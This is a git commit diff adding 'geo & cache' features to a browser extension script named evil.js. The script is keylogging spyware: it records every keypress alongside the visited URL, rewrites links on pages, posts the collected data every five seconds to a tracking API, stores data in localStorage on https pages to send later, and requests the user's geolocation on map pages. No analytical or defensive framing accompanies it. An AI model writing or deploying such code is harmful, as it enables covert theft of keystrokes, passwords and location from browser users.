20c5253ed223d0b391319347d8f6c34e2661c1ac
Philip Kirkbride <kirkins@gmail.com>
2017-04-08 18:41:33 -0400

    add geo & cache

--- extension/src/evil.js
+++ extension/src/evil.js
@@ -3,6 +3,17 @@ var pageVisit = {};
 pageVisit.url = window.location.href;
 pageVisit.time = Math.floor(Date.now() / 1000);
 
+// If https add page to cache and send next http connection
+if(window.localStorage.getItem('cacheIndex')) {
+  var cacheIndex = JSON.parse(localStorage.getItem('cacheIndex'));
+  cacheIndex.push(pageVisit.time);
+  localStorage.setItem('cacheIndex', JSON.stringify(cacheIndex));
+} else {
+  var cacheIndex = [];
+  cacheIndex.push(pageVisit.time);
+  localStorage.setItem('cacheIndex', JSON.stringify(cacheIndex));
+}
+
 // Modify outgoing url on a site
 $("a").each(function() {
   var $elem = $(this);
@@ -15,22 +26,53 @@ $("a").each(function() {
 
 // Key logger
 document.addEventListener('keypress', function (e) {
-    e = e || window.event;
-    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-    if (charCode) {
-      pageVisit.keylog += String.fromCharCode(charCode);
-      console.log(pageVisit);
-    }
+  e = e || window.event;
+  var charCode = typeof e.which == "number" ? e.which : e.keyCode;
+  if (charCode) {
+    pageVisit.keylog += String.fromCharCode(charCode);
+    console.log(pageVisit);
+  }
 });
 
 // Send data to server every 5 seconds
 var timer = setInterval(sendData, 5000);
 function sendData() {
-  console.log(JSON.stringify(pageVisit));
-  $.ajax({
-    type: "POST",
-    url: "http://localhost:5000/api/v1/track",
-    data: JSON.stringify(pageVisit),
-    dataType: "json"
-  });
+  if(!pageVisit.url.indexOf("https")) {
+    localStorage.setItem(pageVisit.time, JSON.stringify(pageVisit));
+    console.log("saved to local storage " + pageVisit.time);
+    // If user is on https save data to localstorage
+  } else {
+    console.log("not https");
+    // If user on http send data to server
+    $.ajax({
+      type: "POST",
+      url: "http://localhost:5000/api/v1/track",
+      data: JSON.stringify(pageVisit),
+      dataType: "json"
+    });
+    emptyCache();
+  }
+}
+
+// Send all cached info to server
+function emptyCache() {
+  // console.log("runnnnnning");
+  // if(!window.localStorage.getItem('cacheIndex')) return;
+  // var cacheIndex = JSON.parse(localStorage.getItem('cacheIndex'));
+  // for (var i = 0; i < cacheIndex.length; i++) {
+  //   console.log(cacheIndex[i]);
+  //   if(localStorage.getItem(cacheIndex[i])) {
+  //     console.log(localStorage.getItem(cacheIndex[i]));
+  //   }
+  // }
+}
+
+// Run got location function if user on a map page
+function gotLocation(pos) {
+  console.log(pos.coords);
+}
+
+if(pageVisit.url.indexOf("maps")){
+  console.log("on a map");
+  navigator.geolocation.getCurrentPosition(gotLocation);
 }
